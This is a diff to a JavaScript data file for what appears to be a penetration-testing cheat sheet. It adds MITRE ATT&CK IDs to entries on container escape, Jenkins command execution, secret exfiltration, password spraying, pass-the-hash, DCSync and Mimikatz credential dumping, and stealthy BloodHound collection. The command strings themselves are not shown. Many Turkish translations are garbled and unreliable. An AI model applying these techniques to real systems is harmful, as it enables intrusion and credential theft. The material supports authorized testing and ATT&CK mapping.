-            "desc_tr": "SMB: share enum, user enum, vuln scan, null session"
+            "desc_tr": "SMB: share enum, user enum, vuln scan, null session",
+            "attack": [
+              "T1046",
+              "T1135"
+            ]
           },
           {
             "title": "Port 161 — SNMP Checks",
@@ -17366,7 +20172,10 @@ module.exports = [
               "essential"
             ],
             "desc": "LDAP: anonymous bind, base DN enumeration",
-            "desc_tr": "LDAP: anonymous bind, base DN enumeration"
+            "desc_tr": "LDAP: anonymous bind, base DN enumeration",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 1433 — MSSQL Checks",
@@ -17379,7 +20188,10 @@ module.exports = [
               "essential"
             ],
             "desc": "MSSQL: info gathering, authentication, query execution",
-            "desc_tr": "MSSQL: info gathering, authentication, query execution"
+            "desc_tr": "MSSQL: info gathering, authentication, query execution",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 1521 — Oracle Checks",
@@ -17391,7 +20203,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Oracle: SID brute force and ODAT enumeration",
-            "desc_tr": "Oracle: SID brute force and ODAT enumeration"
+            "desc_tr": "Oracle: SID brute force and ODAT enumeration",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 2049 — NFS Checks",
@@ -17403,7 +20218,10 @@ module.exports = [
               "essential"
             ],
             "desc": "NFS: share listing and mount options",
-            "desc_tr": "NFS: share listing and mount options"
+            "desc_tr": "NFS: share listing and mount options",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 3306 — MySQL Checks",
@@ -17416,7 +20234,11 @@ module.exports = [
               "essential"
             ],
             "desc": "MySQL: info, authentication, brute force",
-            "desc_tr": "MySQL: info, authentication, brute force"
+            "desc_tr": "MySQL: info, authentication, brute force",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Port 3389 — RDP Checks",
@@ -17428,7 +20250,11 @@ module.exports = [
               "essential"
             ],
             "desc": "RDP: encryption check, MS12-020 vuln, connection test",
-            "desc_tr": "RDP: encryption check, MS12-020 vuln, connection test"
+            "desc_tr": "RDP: encryption check, MS12-020 vuln, connection test",
+            "attack": [
+              "T1046",
+              "T1021.001"
+            ]
           },
           {
             "title": "Port 5432 — PostgreSQL Checks",
@@ -17440,7 +20266,10 @@ module.exports = [
               "tool"
             ],
             "desc": "PostgreSQL: brute force and connection test",
-            "desc_tr": "PostgreSQL: brute force and connection test"
+            "desc_tr": "PostgreSQL: brute force and connection test",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 5900 — VNC Checks",
@@ -17452,7 +20281,10 @@ module.exports = [
               "tool"
             ],
             "desc": "VNC: version info, brute force, connection",
-            "desc_tr": "VNC: version info, brute force, connection"
+            "desc_tr": "VNC: version info, brute force, connection",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 5985 — WinRM Checks",
@@ -17465,7 +20297,11 @@ module.exports = [
               "essential"
             ],
             "desc": "WinRM: authentication testing and shell access",
-            "desc_tr": "WinRM: authentication testing and shell access"
+            "desc_tr": "WinRM: authentication testing and shell access",
+            "attack": [
+              "T1046",
+              "T1021.006"
+            ]
           },
           {
             "title": "Port 6379 — Redis Checks",
@@ -17478,7 +20314,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Redis: info gathering, unauthenticated access, config dump",
-            "desc_tr": "Redis: info gathering, unauthenticated access, config dump"
+            "desc_tr": "Redis: info gathering, unauthenticated access, config dump",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 8080/8443 — Web App Checks",
@@ -17491,7 +20330,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Web app servers: technology ID, directory enum, default creds",
-            "desc_tr": "Web uygulama sunucuları: teknoloji tespiti, dizin keşfi, varsayılan kimlik bilgileri"
+            "desc_tr": "Web uygulama sunucuları: teknoloji tespiti, dizin keşfi, varsayılan kimlik bilgileri",
+            "attack": [
+              "T1595.003"
+            ]
           },
           {
             "title": "Port 27017 — MongoDB Checks",
@@ -17503,7 +20345,10 @@ module.exports = [
               "tool"
             ],
             "desc": "MongoDB: info gathering and unauthenticated database listing",
-            "desc_tr": "MongoDB: info gathering and unauthenticated database listing"
+            "desc_tr": "MongoDB: info gathering and unauthenticated database listing",
+            "attack": [
+              "T1046"
+            ]
           }
         ],
         "name_tr": "Quick Service Checks"
@@ -17523,7 +20368,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "FTP saldırı kontrol listesi"
+            "desc_tr": "FTP saldırı kontrol listesi",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Port 22 SSH",
@@ -17536,7 +20385,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SSH saldırı kontrol listesi"
+            "desc_tr": "SSH saldırı kontrol listesi",
+            "attack": [
+              "T1110.001",
+              "T1552.001",
+              "T1021.004"
+            ]
           },
           {
             "title": "Port 25 SMTP",
@@ -17549,7 +20403,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SMTP saldırı kontrol listesi"
+            "desc_tr": "SMTP saldırı kontrol listesi",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Port 445 SMB",
@@ -17563,7 +20420,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SMB saldırı kontrol listesi"
+            "desc_tr": "SMB saldırı kontrol listesi",
+            "attack": [
+              "T1046",
+              "T1135"
+            ]
           },
           {
             "title": "Port 1433 MSSQL",
@@ -17576,7 +20437,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "MSSQL saldırı kontrol listesi"
+            "desc_tr": "MSSQL saldırı kontrol listesi",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Port 3306 MySQL",
@@ -17589,7 +20454,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "MySQL saldırı kontrol listesi"
+            "desc_tr": "MySQL saldırı kontrol listesi",
+            "attack": [
+              "T1110.001",
+              "T1046"
+            ]
           },
           {
             "title": "Port 5985 WinRM",
@@ -17601,7 +20470,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "WinRM saldırı kontrol listesi"
+            "desc_tr": "WinRM saldırı kontrol listesi",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Port 6379 Redis",
@@ -17616,7 +20488,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Redis saldırı kontrol listesi"
+            "desc_tr": "Redis saldırı kontrol listesi",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Port 27017 MongoDB",
@@ -17629,7 +20504,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "MongoDB saldırı kontrol listesi"
+            "desc_tr": "MongoDB saldırı kontrol listesi",
+            "attack": [
+              "T1046"
+            ]
           }
         ],
         "name_tr": "Service-Specific Attack Playbooks"
@@ -17690,7 +20568,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Get an interactive shell inside a running container",
-            "desc_tr": "Get an interactive shell inside a running container"
+            "desc_tr": "Get an interactive shell inside a running container",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Check if Inside Container",
@@ -17716,7 +20597,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Exploit mounted Docker socket to escape container",
-            "desc_tr": "İstismar et: r mounted Docker socket escape container'e"
+            "desc_tr": "İstismar et: r mounted Docker socket escape container'e",
+            "attack": [
+              "T1611"
+            ]
           },
           {
             "title": "Privileged Container Escape",
@@ -17732,7 +20616,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Escape a --privileged container via cgroups release_agent",
-            "desc_tr": "Escape a --privileged container cgroups release_agent üzerinden"
+            "desc_tr": "Escape a --privileged container cgroups release_agent üzerinden",
+            "attack": [
+              "T1611"
+            ]
           },
           {
             "title": "Mount Host Filesystem",
@@ -17750,7 +20637,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Enter the host namespaces from a privileged container",
-            "desc_tr": "Enter the host namespaces a privileged container üzerinden"
+            "desc_tr": "Enter the host namespaces a privileged container üzerinden",
+            "attack": [
+              "T1059.004",
+              "T1611"
+            ]
           },
           {
             "title": "Check Container Capabilities",
@@ -17789,7 +20680,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Test and exploit SYS_ADMIN capability for container escape",
-            "desc_tr": "Test et: and istismar SYS_ADMcapability for container escape içinde"
+            "desc_tr": "Test et: and istismar SYS_ADMcapability for container escape içinde",
+            "attack": [
+              "T1611"
+            ]
           },
           {
             "title": "Deepce Container Escape Scanner",
@@ -17798,7 +20692,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Automated Docker container escape detection tool",
-            "desc_tr": "Otomatik Docker container escape detectitool üzerinde"
+            "desc_tr": "Otomatik Docker container escape detectitool üzerinde",
+            "attack": [
+              "T1611"
+            ]
           },
           {
             "title": "Docker API Exploit",
@@ -17831,7 +20728,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Break host namespace'e"
+            "desc_tr": "Break host namespace'e",
+            "attack": [
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "Docker Enumeration & Escape"
@@ -17918,7 +20818,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Get an interactive shell in a running pod",
-            "desc_tr": "Get an interactive shell in a running pod"
+            "desc_tr": "Get an interactive shell in a running pod",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Copy File from Pod",
@@ -18143,7 +21046,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Run Docker CIS Benchmark security audit",
-            "desc_tr": "Run Docker CIS Benchmark security audit"
+            "desc_tr": "Run Docker CIS Benchmark security audit",
+            "attack": [
+              "T1611"
+            ]
           },
           {
             "title": "Falco Runtime Security",
@@ -18181,7 +21087,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Execute system commands via Jenkins Groovy Script Console",
-            "desc_tr": "Execute system commands via Jenkins Groovy Script Console"
+            "desc_tr": "Execute system commands via Jenkins Groovy Script Console",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "Jenkins Credential Dump (Groovy)",
@@ -18208,7 +21117,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Execute Groovy script via Jenkins API remotely",
-            "desc_tr": "Execute Groovy script via Jenkins API remotely"
+            "desc_tr": "Execute Groovy script via Jenkins API remotely",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "GitLab CI Token from Runner",
@@ -18258,7 +21170,10 @@ module.exports = [
             ],
             "desc": "Exploit pull_request_target for secret exfiltration",
             "note": "Only in controlled/authorized testing scenarios",
-            "desc_tr": "İstismar et: r pull_request_target for secret exfiltration"
+            "desc_tr": "İstismar et: r pull_request_target for secret exfiltration",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Terraform State Secrets",
@@ -18480,7 +21395,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all SMB shares"
+            "desc_tr": "List all SMB shares",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "NXC SMB Enumerate Users",
@@ -18489,7 +21407,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List domain users via RID brute force"
+            "desc_tr": "List domain users via RID brute force",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "NXC SMB Enumerate Groups",
@@ -18576,7 +21497,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "parola püskürtme multiple hosts'e karşı"
+            "desc_tr": "parola püskürtme multiple hosts'e karşı",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB User List Spray",
@@ -18585,7 +21509,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Spray a password against a user list"
+            "desc_tr": "Spray a password against a user list",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Pass the Hash",
@@ -18594,7 +21521,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "kimlik doğrulama NTLM hash kullanarak"
+            "desc_tr": "kimlik doğrulama NTLM hash kullanarak",
+            "attack": [
+              "T1550.002"
+            ]
           },
           {
             "title": "NXC SMB Execute Command",
@@ -18603,7 +21533,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run command via SMBExec"
+            "desc_tr": "Run command via SMBExec",
+            "attack": [
+              "T1033",
+              "T1021.002"
+            ]
           },
           {
             "title": "NXC SMB PowerShell Exec",
@@ -18612,7 +21546,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run PowerShell command via SMB"
+            "desc_tr": "Run PowerShell command via SMB",
+            "attack": [
+              "T1057",
+              "T1059.001"
+            ]
           },
           {
             "title": "NXC SMB WMI Exec",
@@ -18621,7 +21559,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute command via WMI"
+            "desc_tr": "Execute command via WMI",
+            "attack": [
+              "T1033",
+              "T1047"
+            ]
           },
           {
             "title": "NXC SMB AT Exec",
@@ -18630,7 +21572,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Execute command via scheduled task"
+            "desc_tr": "Execute command via scheduled task",
+            "attack": [
+              "T1033",
+              "T1053.005"
+            ]
           },
           {
             "title": "NXC SMB Kerberos Auth",
@@ -18667,7 +21613,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tek kullanıcı için parola brute force"
+            "desc_tr": "Tek kullanıcı için parola brute force",
+            "attack": [
+              "T1110.001",
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Brute Force User + Pass Lists",
@@ -18677,7 +21627,11 @@ module.exports = [
               "essential"
             ],
             "note": "Without --no-bruteforce: tries every user with every password (N*M attempts)",
-            "desc_tr": "Tüm kullanıcı/parola kombinasyonlarını dene (brute force modu)"
+            "desc_tr": "Tüm kullanıcı/parola kombinasyonlarını dene (brute force modu)",
+            "attack": [
+              "T1110.001",
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Spray No Brute",
@@ -18687,7 +21641,11 @@ module.exports = [
               "essential"
             ],
             "note": "--no-bruteforce pairs each user with its corresponding password line by line",
-            "desc_tr": "Brute force olmadan spray — user1:pass1, user2:pass2 (1:1 eşleşme)"
+            "desc_tr": "Brute force olmadan spray — user1:pass1, user2:pass2 (1:1 eşleşme)",
+            "attack": [
+              "T1110.001",
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Hash Spray",
@@ -18696,7 +21654,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "NTLM hash'i birden fazla kullanıcıya spray et"
+            "desc_tr": "NTLM hash'i birden fazla kullanıcıya spray et",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Hash List Spray",
@@ -18705,7 +21666,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "NTLM hash listesini tek kullanıcıya spray et"
+            "desc_tr": "NTLM hash listesini tek kullanıcıya spray et",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Subnet Spray",
@@ -18714,7 +21678,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tüm subnet'e password spray"
+            "desc_tr": "Tüm subnet'e password spray",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Spray from Targets File",
@@ -18723,7 +21690,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Dosyadaki hedeflere credential spray"
+            "desc_tr": "Dosyadaki hedeflere credential spray",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Check Admin Subnet",
@@ -18733,7 +21703,10 @@ module.exports = [
               "essential"
             ],
             "note": "Look for (Pwn3d!) in output to identify admin access",
-            "desc_tr": "Credential'ların local admin olduğu tüm host'ları bul"
+            "desc_tr": "Credential'ların local admin olduğu tüm host'ları bul",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "NXC SMB Signing Check",
@@ -18762,7 +21735,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Pass the Hash ile komut çalıştır"
+            "desc_tr": "Pass the Hash ile komut çalıştır",
+            "attack": [
+              "T1033",
+              "T1550.002"
+            ]
           },
           {
             "title": "NXC SMB PtH PowerShell",
@@ -18771,7 +21748,12 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Pass the Hash ile PowerShell komutu çalıştır"
+            "desc_tr": "Pass the Hash ile PowerShell komutu çalıştır",
+            "attack": [
+              "T1057",
+              "T1059.001",
+              "T1550.002"
+            ]
           },
           {
             "title": "NXC SMB Domain Auth",
@@ -18798,7 +21780,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Pass the Hash ile tüm domain hash'lerini dökümle"
+            "desc_tr": "Pass the Hash ile tüm domain hash'lerini dökümle",
+            "attack": [
+              "T1550.002"
+            ]
           },
           {
             "title": "NXC SMB DPAPI Module",
@@ -18807,7 +21792,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "DPAPI gizli bilgilerini çıkar (Chrome parolaları, WiFi anahtarları vb.)"
+            "desc_tr": "DPAPI gizli bilgilerini çıkar (Chrome parolaları, WiFi anahtarları vb.)",
+            "attack": [
+              "T1555.003"
+            ]
           },
           {
             "title": "NXC SMB LAPS Reader",
@@ -18834,7 +21822,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "NetExec ile BloodHound verisi topla"
+            "desc_tr": "NetExec ile BloodHound verisi topla",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "NXC SMB WebDAV Check",
@@ -18886,7 +21878,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Dump NTDS.dit (domain hashes) via DCSync"
+            "desc_tr": "Dump NTDS.dit (domain hashes) via DCSync",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "NXC Mimikatz Module",
@@ -18895,7 +21891,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Run Mimikatz logonpasswords"
+            "desc_tr": "Run Mimikatz logonpasswords",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "NXC Lsassy Module",
@@ -18904,7 +21903,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Dump credentials with lsassy"
+            "desc_tr": "Dump credentials with lsassy",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "NXC Spider Shares",
@@ -18922,7 +21924,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Search for GPP stored passwords"
+            "desc_tr": "Search for GPP stored passwords",
+            "attack": [
+              "T1552.006"
+            ]
           },
           {
             "title": "NXC GPP Auto-Login",
@@ -18940,7 +21945,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: for Zerologzafiyet(ler) üzerinde"
+            "desc_tr": "Kontrol et: for Zerologzafiyet(ler) üzerinde",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "NXC PetitPotam Check",
@@ -18949,7 +21957,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: for PetitPotam zafiyet(ler)"
+            "desc_tr": "Kontrol et: for PetitPotam zafiyet(ler)",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "NXC MS17-010 Check",
@@ -18958,7 +21969,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for EternalBlue zafiyet(ler)"
+            "desc_tr": "Kontrol et: for EternalBlue zafiyet(ler)",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "NXC Printnightmare Check",
@@ -18967,7 +21981,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: for PrintNightmare"
+            "desc_tr": "Kontrol et: for PrintNightmare",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "NXC Put File",
@@ -19009,7 +22026,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run command over WinRM"
+            "desc_tr": "Run command over WinRM",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "NXC WinRM Shell",
@@ -19036,7 +22056,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find Kerberoastable users via LDAP"
+            "desc_tr": "Find Kerberoastable users via LDAP",
+            "attack": [
+              "T1558.003"
+            ]
           },
           {
             "title": "NXC LDAP ASREPRoast",
@@ -19045,7 +22068,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find AS-REP roastable users"
+            "desc_tr": "Find AS-REP roastable users",
+            "attack": [
+              "T1558.004"
+            ]
           },
           {
             "title": "NXC LDAP Trusted For Delegation",
@@ -19090,7 +22116,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "xp_cmdshell ile OS komutu çalıştır"
+            "desc_tr": "xp_cmdshell ile OS komutu çalıştır",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "NXC MSSQL Windows Auth",
@@ -19117,7 +22146,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "NTLM hash ile MSSQL'e bağlan"
+            "desc_tr": "NTLM hash ile MSSQL'e bağlan",
+            "attack": [
+              "T1550.002"
+            ]
           },
           {
             "title": "NXC MSSQL Enum Privileges",
@@ -19153,7 +22185,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "MSSQL servisine password spray saldırısı"
+            "desc_tr": "MSSQL servisine password spray saldırısı",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Proxychains NXC MSSQL Auth",
@@ -19162,7 +22197,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SOCKS proxy üzerinden MSSQL'e kimlik doğrulama"
+            "desc_tr": "SOCKS proxy üzerinden MSSQL'e kimlik doğrulama",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains NXC MSSQL Command Exec",
@@ -19171,7 +22210,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SOCKS proxy üzerinden MSSQL'de OS komutu çalıştır"
+            "desc_tr": "SOCKS proxy üzerinden MSSQL'de OS komutu çalıştır",
+            "attack": [
+              "T1033",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains NXC MSSQL Query",
@@ -19180,7 +22224,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SOCKS proxy üzerinden MSSQL'de SQL sorgusu çalıştır"
+            "desc_tr": "SOCKS proxy üzerinden MSSQL'de SQL sorgusu çalıştır",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains NXC MSSQL with Domain",
@@ -19189,7 +22237,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Proxy üzerinden domain kimlik bilgileri ile MSSQL'e bağlan"
+            "desc_tr": "Proxy üzerinden domain kimlik bilgileri ile MSSQL'e bağlan",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           }
         ],
         "name_tr": "WinRM / LDAP / MSSQL"
@@ -19215,7 +22267,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Collect all data types"
+            "desc_tr": "Collect all data types",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "SharpHound Default Collection",
@@ -19224,7 +22280,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Default collecti(fastest) üzerinde"
+            "desc_tr": "Default collecti(fastest) üzerinde",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "SharpHound DCOnly",
@@ -19233,7 +22293,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Only collect DC (stealthy) üzerinden"
+            "desc_tr": "Only collect DC (stealthy) üzerinden",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "SharpHound with Domain",
@@ -19242,7 +22306,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Specify domacollect from'e içinde"
+            "desc_tr": "Specify domacollect from'e içinde",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "SharpHound Custom DC",
@@ -19251,7 +22319,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Specify etki alanı denetleyicisi (DC)"
+            "desc_tr": "Specify etki alanı denetleyicisi (DC)",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "SharpHound Stealth Mode",
@@ -19260,7 +22332,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Stealth collectiLDAP only kullanarak üzerinde"
+            "desc_tr": "Stealth collectiLDAP only kullanarak üzerinde",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py Collection",
@@ -19270,7 +22346,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Uzaktan collectiLinux üzerinden üzerinde"
+            "desc_tr": "Uzaktan collectiLinux üzerinden üzerinde",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py via NTLM Hash",
@@ -19279,7 +22359,12 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Collectipass-the-hash kullanarak üzerinde"
+            "desc_tr": "Collectipass-the-hash kullanarak üzerinde",
+            "attack": [
+              "T1087.002",
+              "T1482",
+              "T1550.002"
+            ]
           },
           {
             "title": "BloodHound.py with Nameserver",
@@ -19289,7 +22374,11 @@ module.exports = [
               "essential"
             ],
             "note": "-ns is critical when your /etc/resolv.conf doesn't point to the DC",
-            "desc_tr": "DNS nameserver belirt (hedef DNS kullanmıyorsan kritik)"
+            "desc_tr": "DNS nameserver belirt (hedef DNS kullanmıyorsan kritik)",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py Kerberos Auth",
@@ -19298,7 +22387,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Kerberos ccache ile veri topla"
+            "desc_tr": "Kerberos ccache ile veri topla",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py DCOnly Collection",
@@ -19307,7 +22400,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Sadece DC'den LDAP ile topla — daha gizli, workstation'lara SMB bağlantısı yok"
+            "desc_tr": "Sadece DC'den LDAP ile topla — daha gizli, workstation'lara SMB bağlantısı yok",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py Specific Collection Methods",
@@ -19317,7 +22414,11 @@ module.exports = [
               "tool"
             ],
             "note": "Methods: Default, Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, DCOM, PSRemote, ObjectProps, DCOnly, All",
-            "desc_tr": "All yerine belirli collection method'ları seç"
+            "desc_tr": "All yerine belirli collection method'ları seç",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py via Proxychains",
@@ -19326,7 +22427,13 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SOCKS proxy üzerinden BloodHound verisi topla (pivoting)"
+            "desc_tr": "SOCKS proxy üzerinden BloodHound verisi topla (pivoting)",
+            "attack": [
+              "T1087.002",
+              "T1482",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "BloodHound.py Custom Output Directory",
@@ -19335,7 +22442,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Çıktıyı belirli dizine kaydet"
+            "desc_tr": "Çıktıyı belirli dizine kaydet",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py Disable Pooling",
@@ -19344,7 +22455,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Tek bağlantı kullan (yavaş ama EDR tespitinden kaçınır)"
+            "desc_tr": "Tek bağlantı kullan (yavaş ama EDR tespitinden kaçınır)",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound.py DNS Lookup Fix",
@@ -19357,7 +22472,11 @@ module.exports = [
               "essential"
             ],
             "note": "bloodhound-python often fails if DC FQDN can't resolve — /etc/hosts fix is the most common solution",
-            "desc_tr": "DC hostname çözümlenemezse /etc/hosts'a ekle sonra topla"
+            "desc_tr": "DC hostname çözümlenemezse /etc/hosts'a ekle sonra topla",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "RustHound Collection",
@@ -19436,7 +22555,10 @@ module.exports = [
               "essential"
             ],
             "note": "Run in BloodHound raw query or Neo4j browser",
-            "desc_tr": "saldırı yolları owned users DomaAdmin üzerinden'e içinde"
+            "desc_tr": "saldırı yolları owned users DomaAdmin üzerinden'e içinde",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Find Kerberoastable Users",
@@ -19445,7 +22567,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Users SPNs (Kerberoastable) ile"
+            "desc_tr": "Users SPNs (Kerberoastable) ile",
+            "attack": [
+              "T1558.003"
+            ]
           },
           {
             "title": "Find AS-REP Roastable",
@@ -19499,7 +22624,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
